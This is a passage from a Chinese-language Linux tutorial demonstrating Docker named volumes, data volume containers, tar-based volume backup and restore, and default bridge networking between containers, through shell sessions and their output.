<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>
<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>


#显示命名数据卷
[root@ubuntu1804 ~]#docker volume ls
DRIVER             VOLUME NAME
local               vol1


#查看命名数据卷详解信息
[root@ubuntu1804 ~]#docker volume inspect vol1
[
   {
        "CreatedAt": "2020-07-21T18:44:03+08:00",
        "Driver": "local",
        "Labels": {},
        "Mountpoint": "/var/lib/docker/volumes/vol1/_data",
        "Name": "vol1",
        "Options": {},
        "Scope": "local"
   }
]



[root@ubuntu1804 ~]#docker inspect --format="{{.Mounts}}" nginx01
[{volume vol1 /var/lib/docker/volumes/vol1/_data /usr/share/nginx/html local z 
true }]



#查看命名数据卷的文件
[root@ubuntu1804 ~]#ls /var/lib/docker/volumes/vol1/_data
50x.html index.html


#修改宿主机命名数据卷的文件
[root@ubuntu1804 ~]#echo nginx vol1 website > /var/lib/docker/volumes/vol1/_data/index.html
[root@ubuntu1804 ~]#curl 127.0.0.1:8001
nginx vol1 website



#利用现在的命名数据卷再创建新容器,可以和原有容器共享同一个命名数据卷的数据
[root@ubuntu1804 ~]#docker run -d -p 8002:80 --name nginx02 -v vol1:/usr/share/nginx/html nginx
fb8739438992b7797a3f23dc495d2fd43f513fd793114848171f376c4325675e
[root@ubuntu1804 ~]#curl 127.0.0.1:8002
nginx vol1 website
```

**创建容器时自动创建命名数据卷**

```
#创建容器自动创建命名数据卷
[root@ubuntu1804 ~]#docker run -d -p 8003:80 --name nginx03 -v vol2:/usr/share/nginx/html nginx
5d7497c04907babcb2084f8f7a16874223e07965410fd4da14bc2fe993277aed


[root@ubuntu1804 ~]#docker volume ls
DRIVER             VOLUME NAME
local               portainer_data
local               vol1
local               vol2
```

**删除数据卷**

```
#删除指定的命名数据卷
[root@ubuntu1804 ~]#docker volume rm vol1


#清理全部不再使用的卷
[root@ubuntu1804 ~]#docker volume prune -f
```

##### 48.7.2.3 数据卷容器(了解)

###### 48.7.2.3.1 数据卷容器介绍

![1660034535785](linux体系.assets/1660034535785.png)

```
在Dockerfile中创建的是匿名数据卷,无法直接实现多个容器之间共享数据。
数据卷容器最大的功能是可以让数据在多个docker容器之间共享。
如下图所示: 即可以让B容器访问A容器的内容，而容器C也可以访问A容器的内容，即可以实现A，B，C 三个容器之间的数据读写共享。
```

![1660034859719](linux体系.assets/1660034859719.png)

```
相当于先要创建一个后台运行的容器作为 Server，用于提供数据卷，这个卷可以为其他容器提供数据存储服务，其他使用此卷的容器作为client端 ，但此方法并不常使用。
缺点: 因为依赖一个 Server 的容器，所以此 Server 容器出了问题，其它 Client容器都会受影响。
```

###### 48.7.2.3.2 实战案例: 数据卷容器

**创建一个数据卷容器 Server**

```
#先创建一个容器而无需启动也可以，并挂载宿主机的数据目录
#范例: 使用之前的镜像创建数据卷容器
#数据卷容器一般无需映射端口
[root@ubuntu1804 ~]#docker run -d --name volume-server -v /data/bin/catalina.sh:/apps/tomcat/bin/catalina.sh:ro -v
/data/testapp:/data/tomcat/webapps/testapp   tomcat-web:app1
109a34c5a83b23bc57b16fc8b1e19104d3d522a8c62e1e98d8e69577b01739b5


[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS               NAMES
109a34c5a83b       tomcat-web:app1     "/apps/tomcat/bin/ru…"   14 seconds ago 
    Up 13 seconds       8009/tcp, 8080/tcp   volume-server
```

**启动多个数据卷容器Client**

```
[root@ubuntu1804 ~]#docker run -d --name client1 --volumes-from volume-server -p 8081:8080 tomcat-web:app1
fe6ce0548dfee924cd39a8d86d5ed0e8ce9ea65323742f1336fa3b002c1b4a8c
[root@ubuntu1804 ~]#docker run -d --name client2 --volumes-from volume-server -p 8082:8080 tomcat-web:app1
10397838df9a489d7af2112850d4285bff5c2c262ea05cc9c5fb265af538f2c8



[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS                             NAMES
10397838df9a       tomcat-web:app1     "/apps/tomcat/bin/ru…"   30 seconds ago 
    Up 27 seconds       8009/tcp, 0.0.0.0:8082->8080/tcp   client2
fe6ce0548dfe       tomcat-web:app1     "/apps/tomcat/bin/ru…"   40 seconds ago 
    Up 38 seconds       8009/tcp, 0.0.0.0:8081->8080/tcp   client1
109a34c5a83b       tomcat-web:app1     "/apps/tomcat/bin/ru…"   2 minutes ago   
    Up 2 minutes        8009/tcp, 8080/tcp                 volume-server
```

**验证访问**

```
[root@ubuntu1804 ~]#curl 127.0.0.1:8081/testapp/
testapp v3
[root@ubuntu1804 ~]#curl 127.0.0.1:8082/testapp/
testapp v3
```

**进入容器测试读写**

```
#读写权限依赖于源数据卷Server容器
#进入 Server 容器修改数据
[root@ubuntu1804 ~]#docker exec -it volume-server bash
[root@109a34c5a83b /]# cat /data/tomcat/webapps/testapp/index.html
testapp v3
[root@109a34c5a83b /]# echo testapp v4 > /data/tomcat/webapps/testapp/index.html
[root@ubuntu1804 ~]#curl 127.0.0.1:8081/testapp/
testapp v4
[root@ubuntu1804 ~]#curl 127.0.0.1:8082/testapp/
testapp v4



#进入 Client 容器修改数据
[root@ubuntu1804 ~]#docker exec -it client1 bash
[root@fe6ce0548dfe /]# cat /data/tomcat/webapps/testapp/index.html 
testapp v4
[root@fe6ce0548dfe /]# echo testapp v5 > /data/tomcat/webapps/testapp/index.html
[root@fe6ce0548dfe /]# cat /data/tomcat/webapps/testapp/index.html
testapp v5


[root@ubuntu1804 ~]#curl 127.0.0.1:8081/testapp/
testapp v5
[root@ubuntu1804 ~]#curl 127.0.0.1:8082/testapp/
testapp v5
```

**在宿主机直接修改**

```
[root@ubuntu1804 ~]#cat /data/testapp/index.html 
testapp v5
[root@ubuntu1804 ~]#echo testapp v6 > /data/testapp/index.html
[root@ubuntu1804 ~]#cat /data/testapp/index.html
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8081/testapp/
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8082/testapp/
testapp v6


[root@ubuntu1804 ~]#docker exec -it volume-server bash
[root@109a34c5a83b /]# cat /data/tomcat/webapps/testapp/index.html
testapp v6
```

**关闭卷容器Server测试能否启动新容器**

```
#关闭卷容器Server，仍然可以创建新的client容器及访问旧的client容器
[root@ubuntu1804 ~]#docker stop volume-server 
volume-server
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS                             NAMES
10397838df9a       tomcat-web:app1     "/apps/tomcat/bin/ru…"   9 minutes ago   
    Up 9 minutes        8009/tcp, 0.0.0.0:8082->8080/tcp   client2
fe6ce0548dfe       tomcat-web:app1     "/apps/tomcat/bin/ru…"   10 minutes ago 
    Up 10 minutes       8009/tcp, 0.0.0.0:8081->8080/tcp   client1
[root@ubuntu1804 ~]#docker run -d --name client3 --volumes-from volume-server -p 8083:8080 tomcat-web:app1
458df991688c3dbc69d824f889616e0a7534ce18543c8559162f3609fbb26b53


[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS                           PORTS                             NAMES
458df991688c       tomcat-web:app1     "/apps/tomcat/bin/ru…"   About a minute 
ago   Up About a minute                 8009/tcp, 0.0.0.0:8083->8080/tcp   
client3
10397838df9a       tomcat-web:app1     "/apps/tomcat/bin/ru…"   11 minutes ago 
      Up 11 minutes                     8009/tcp, 0.0.0.0:8082->8080/tcp   
client2
fe6ce0548dfe       tomcat-web:app1     "/apps/tomcat/bin/ru…"   11 minutes ago 
      Up 11 minutes                     8009/tcp, 0.0.0.0:8081->8080/tcp   
client1
109a34c5a83b       tomcat-web:app1     "/apps/tomcat/bin/ru…"   13 minutes ago 
      Exited (137) About a minute ago                                     
volume-server


[root@ubuntu1804 ~]#curl 127.0.0.1:8081/testapp/
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8082/testapp/
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8083/testapp/
testapp v6
```

**删除源卷容器Server，访问client和创建新的client容器**

```
#删除数据卷容器后，旧的client容器仍能访问，但无法再创建新的client容器
[root@ubuntu1804 ~]#docker rm -fv volume-server
volume-server
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS                             NAMES
458df991688c       tomcat-web:app1     "/apps/tomcat/bin/ru…"   4 minutes ago   
    Up 4 minutes        8009/tcp, 0.0.0.0:8083->8080/tcp   client3
10397838df9a       tomcat-web:app1     "/apps/tomcat/bin/ru…"   14 minutes ago 
    Up 14 minutes       8009/tcp, 0.0.0.0:8082->8080/tcp   client2
fe6ce0548dfe       tomcat-web:app1     "/apps/tomcat/bin/ru…"   14 minutes ago 
    Up 14 minutes       8009/tcp, 0.0.0.0:8081->8080/tcp   client1
    
    
[root@ubuntu1804 ~]#docker run -d --name client4 --volumes-from volume-server -p 8084:8080 tomcat-web:app1
Unable to find image 'tomcat-web:app1' locally
docker: Error response from daemon: pull access denied for tomcat-web, 
repository does not exist or may require 'docker login': denied: requested 
access to the resource is denied.
See 'docker run --help'.


[root@ubuntu1804 ~]#curl 127.0.0.1:8081/testapp/
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8082/testapp/
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8083/testapp/
testapp v6
```

**重新创建容器卷 Server**

```
#重新创建容器卷容器后，还可继续创建新client容器
[root@ubuntu1804 ~]#docker run -d --name volume-server -v  /data/bin/catalina.sh:/apps/tomcat/bin/catalina.sh:ro -v  /data/testapp:/data/tomcat/webapps/testapp   tomcat-web:app1
ee0dacff6a4531dc8ecc1d416b449e087d8bf27dad2d6a6e515faf10455a1cc0
[root@ubuntu1804 ~]#docker run -d --name client4 --volumes-from volume-server -p 8084:8080 tomcat-web:app1
dcd002fe87887a0c5d1f62b24cd7665e42ee864c975d1a2953c383af0cb65a70



[root@ubuntu1804 ~]#curl 127.0.0.1:8081/testapp/
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8082/testapp/
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8083/testapp/
testapp v6
[root@ubuntu1804 ~]#curl 127.0.0.1:8084/testapp/
testapp v6
```

###### 48.7.2.3.3 数据卷容器备份

```
由于匿名数据卷在宿主机中的存储位置不确定,所以为了方便的备份匿名数据卷,可以利用数据卷容器实现数据卷的备份。
```

![1660037248164](linux体系.assets/1660037248164.png)

```
#在执行备份命令容器上执行备份方式
docker run -it --rm --volumes-from [container name] -v $(pwd):/backup ubuntu
root@ca5bb2c1f877:/#tar cvf /backup/backup.tar [container data volume]


#说明
[container name]        #表示需要备份的容器
[container data volume] #表示容器内的需要备份的数据卷对应的目录


#还原方式
docker run -it --rm --volumes-from [container name] -V $(pwd):/backup ubuntu
root@ca5bb2c1f877:/#tar xvf /backup/backup.tar -C [container data volume]
```

**范例:** 

```
#创建需要备份的数据卷容器
[root@ubuntu1804 ~]#docker run -it -v /datavolume1 --name volume-server centos bash
[root@88bbc22a3072 /]# ls
bin   dev home lib64   media opt root sbin sys usr
datavolume1 etc lib lost+found mnt   proc run   srv   tmp var
[root@88bbc22a3072 /]# touch /datavolume1/centos.txt
[root@88bbc22a3072 /]# exit
exit


[root@ubuntu1804 ~]#docker ps
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES


#可以看到数据卷对应的宿主机目录
[root@ubuntu1804 ~]#docker inspect --format="{{.Mounts}}" volume-server
[{volume 21199be9bff7ce98926f673d2250d64d75aaa00c5d375a2528b2b47f0ec4cb93 
/var/lib/docker/volumes/21199be9bff7ce98926f673d2250d64d75aaa00c5d375a2528b2b47f
0ec4cb93/_data /datavolume1 local  true }]



#利用数据卷容器创建执行备份操作容器
[root@ubuntu1804 ~]#docker run -it --rm --volumes-from volume-server -v ~/backup:/backup --name backup-server ubuntu
root@9ad8be4b5810:/# ls 
backup boot         dev home lib32 libx32 mnt proc run   srv tmp var
bin     datavolume1 etc lib   lib64 media   opt root sbin sys usr
root@9ad8be4b5810:/# ls /backup/
root@9ad8be4b5810:/# ls /datavolume1/
centos.txt
root@9ad8be4b5810:/# cd /datavolume1/
root@9ad8be4b5810:/datavolume1# tar cvf /backup/data.tar .
./
./centos.txt
root@9ad8be4b5810:/datavolume1# exit
exit
[root@ubuntu1804 ~]#ls ~/backup/
data.tar



#删除容器的数据
[root@ubuntu1804 ~]#docker start -i volume-server 
[root@88bbc22a3072 /]# rm -rf /datavolume1/*
[root@88bbc22a3072 /]# ls /datavolume1/          
[root@88bbc22a3072 /]# exit
exit



#进行还原
[root@ubuntu1804 ~]#docker run -it -v /datavolume1 --name volume-server centos bash
[root@ubuntu1804 ~]#docker run --rm --volumes-from volume-server -v ~/backup:/backup --name backup-server ubuntu tar xvf /backup/data.tar -C /datavolume1/
./
./centos.txt



#验证是否还原
[root@ubuntu1804 ~]#docker start -i volume-server 
[root@88bbc22a3072 /]# ls /datavolume1/
centos.txt
```

###### 48.7.2.3.4 数据卷容器总结

```
将提供卷的容器Server删除，已经运行的容器Client依然可以使用挂载的卷，因为容器是通过挂载访问数据的，但是无法创建新的卷容器客户端，但是再把卷容器Server创建后即可正常创建卷容器Client，此方式可以用于线上共享数据目录等环境，因为即使数据卷容器被删除了，其他已经运行的容器依然可以挂载使用。

由此可知, 数据卷容器的功能只是将数据挂载信息传递给了其它使用数据卷容器的容器,而数据卷容器本身并不提供数据存储功能。

数据卷容器可以作为共享的方式为其他容器提供文件共享，类似于NFS共享，可以在生产中启动一个实例挂载本地的目录，然后其他的容器分别挂载此容器的目录，即可保证各容器之间的数据一致性。

数据卷容器的Server 和 Client可以不使用同一个镜像生成。
```

### 48.8 Docker网络管理

docker容器创建后，必不可少的要和其它主机或容器进行网络通信。

官方文档:

```
https://docs.docker.com/network/
```

#### 48.8.1 Docker的默认的网络通信

![1660057129621](linux体系.assets/1660057129621.png)

##### 48.8.1.1 Docker安装后默认的网络设置

```
Docker服务安装完成之后，默认在每个宿主机会生成一个名称为docker0的网卡其IP地址都是172.17.0.1/16
#范例: 安装Docker的默认的网络配置
[root@centos7 ~]# yum -y install bridge-utils
[root@centos7 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:90:b9:33 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.77/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:bd:a0:ad:fa brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:bdff:fea0:adfa/64 scope link 
       valid_lft forever preferred_lft forever



#每启动一个容器就会添加一个网卡
[root@centos7 ~]# brctl show
bridge name	  bridge id		     STP enabled	interfaces
docker0		  8000.0242bda0adfa	  no	
```

##### 48.8.1.2 创建容器后的网络配置

```
每次新建容器后
1）宿主机多了一个虚拟网卡，和容器的网卡组合成一个网卡，比如: 137: veth8ca6d43@if136，而在容器内的网卡名为136，可以看出和宿主机的网卡之间的关联。
2）容器会自动获取一个172.17.0.0/16网段的随机地址，默认从172.17.0.2开始，第二次容器为172.17.0.3，以此类推。
3）容器获取的地址并不固定,每次容器重启,可能会发生地址变化。
```

**创建第一个容器后的网络状态**

```
#范例: 创建容器，容器自动获取IP地址
[root@ubuntu1804 ~]#docker run -it --rm alpine:3.11 sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
136: eth0@if137: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2 6b8d9f3a653e



[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES
6b8d9f3a653e       alpine:3.11         "sh"                13 seconds ago     
Up 12 seconds                           pensive_chandrasekhar




#范例: 新建第一个容器，宿主机的网卡多了一个新网卡
[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:34:df:91 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe34:df91/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
group default
link/ether 02:42:02:7f:a8:c6 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:2ff:fe7f:a8c6/64 scope link 
       valid_lft forever preferred_lft forever
137: veth8ca6d43@if136: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue 
master docker0 state UP group default 
   link/ether fa:96:37:77:a9:a9 brd ff:ff:ff:ff:ff:ff link-netnsid 0
   inet6 fe80::f896:37ff:fe77:a9a9/64 scope link 
       valid_lft forever preferred_lft forever
       
       
       
       
#查看新建容器后桥接状态
[root@ubuntu1804 ~]#brctl show
bridge name      bridge id          STP enabled    interfaces
docker0          8000.0242027fa8c6  no             veth8ca6d43
```

**创建第二个容器后面的网络状态**

```
[root@ubuntu1804 ~]#docker run -it --rm alpine:3.11 sh
/ # ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
140: eth0@if141: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
 / # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3 ab3ea580804a
/ # ping ab3ea580804a
PING ab3ea580804a (172.17.0.3): 56 data bytes
64 bytes from 172.17.0.3: seq=0 ttl=64 time=0.037 ms
64 bytes from 172.17.0.3: seq=1 ttl=64 time=0.132 ms
^C
--- ab3ea580804a ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.037/0.084/0.132 ms
/ # ping 6b8d9f3a653e
ping: bad address '6b8d9f3a653e'
/ #



#宿主机又多了一个虚拟网卡
[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:34:df:91 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe34:df91/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
group default 
   link/ether 02:42:02:7f:a8:c6 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:2ff:fe7f:a8c6/64 scope link 
       valid_lft forever preferred_lft forever
137: veth8ca6d43@if136: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue 
master docker0 state UP group default 
   link/ether fa:96:37:77:a9:a9 brd ff:ff:ff:ff:ff:ff link-netnsid 0
   inet6 fe80::f896:37ff:fe77:a9a9/64 scope link 
       valid_lft forever preferred_lft forever
141: vethf599a47@if140: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue 
master docker0 state UP group default 
   link/ether 96:e7:52:fe:67:54 brd ff:ff:ff:ff:ff:ff link-netnsid 1
   inet6 fe80::94e7:52ff:fefe:6754/64 scope link 
       valid_lft forever preferred_lft forever
       
       
       
       
#查看新建第二个容器后桥接状态
[root@ubuntu1804 ~]#brctl show
bridge name      bridge id          STP enabled    interfaces
docker0          8000.0242027fa8c6  no             veth8ca6d43                                                                                      vethf599a47
```

##### 48.8.1.3 容器间的通信

 **同一个宿主机的不同容器可相互通信**

```
默认情况下
1）同一个宿主机的不同容器之间可以相互通信。
   dockerd   --icc   Enable inter-container communication (default true)
   --icc=false       #此配置可以禁止同一个宿主机的容器之间通信
2）不同宿主机之间的容器IP地址重复，默认不能相互通信。
```

范例: 同一个宿主机的容器之间访问

```
[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:34:df:91 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe34:df91/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
group default 
   link/ether 02:42:02:7f:a8:c6 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:2ff:fe7f:a8c6/64 scope link 
       valid_lft forever preferred_lft forever
137: veth8ca6d43@if136: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue 
master docker0 state UP group default 
   link/ether fa:96:37:77:a9:a9 brd ff:ff:ff:ff:ff:ff link-netnsid 0
   inet6 fe80::f896:37ff:fe77:a9a9/64 scope link 
       valid_lft forever preferred_lft forever
141: vethf599a47@if140: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue 
master docker0 state UP group default 
   link/ether 96:e7:52:fe:67:54 brd ff:ff:ff:ff:ff:ff link-netnsid 1
   inet6 fe80::94e7:52ff:fefe:6754/64 scope link 
       valid_lft forever preferred_lft forever
       
       
       
[root@ubuntu1804 ~]#docker run -it --rm alpine:3.11 sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
136: eth0@if137: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # ping 172.17.0.3
PING 172.17.0.3 (172.17.0.3): 56 data bytes
64 bytes from 172.17.0.3: seq=0 ttl=64 time=0.452 ms
64 bytes from 172.17.0.3: seq=1 ttl=64 time=0.190 ms
^C
--- 172.17.0.3 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.190/0.321/0.452 ms
/ # ping 172.17.0.1
PING 172.17.0.1 (172.17.0.1): 56 data bytes
64 bytes from 172.17.0.1: seq=0 ttl=64 time=0.139 ms
64 bytes from 172.17.0.1: seq=1 ttl=64 time=0.183 ms
^C
--- 172.17.0.1 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.139/0.161/0.183 ms
```

**禁止同一个宿主机的不同容器间通信**

```
#范例: 同一个宿主机不同容器间禁止通信
[root@ubuntu1804 ~]#vim /lib/systemd/system/docker.service
# for containers run by docker
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --icc=false
[root@ubuntu1804 ~]#systemctl daemon-reload
[root@ubuntu1804 ~]#systemctl restart docker


#创建两个容器,测试无法通信
[root@ubuntu1804 ~]#docker run -it --name test1 --rm alpine sh
/ # hostname -i
172.17.0.2
[root@ubuntu1804 ~]#docker run -it --name test2 --rm alpine sh
/ # hostname -i
172.17.0.3
/ # ping 172.17.0.2
```

**范例: 在第二个宿主机上创建容器，跨宿主机的容器之间默认不能通信**

```
[root@ubuntu1804 ~]#docker pull alpine
Using default tag: latest
latest: Pulling from library/alpine
c9b1b535fdd9: Pull complete 
Digest: sha256:ab00606a42621fb68f2ed6ad3c88be54397f981a7b70a79db3d1172b11c4367d
Status: Downloaded newer image for alpine:latest
docker.io/library/alpine:latest


[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES
cab76bbb3db2       alpine              "sh"               About a minute ago   
Up About a minute                       jolly_rosalind
[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:6b:54:d3 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.101/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe6b:54d3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:1d:73:8b:71 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
       
       
       
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES



[root@ubuntu1804 ~]#docker run -it --rm alpine sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # ping -c 1 172.17.0.3
PING 172.17.0.3 (172.17.0.3): 56 data bytes
--- 172.17.0.3 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
```

##### 48.8.1.4 修改默认网络设置

新建容器默认使用docker0的网络配置,可以修改默认指向自定义的网桥网络

**范例: 用自定义的网桥代替默认的docker0**

```
#查看默认网络
[root@centos7 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:90:b9:33 brd ff:ff:ff:ff:ff:ff
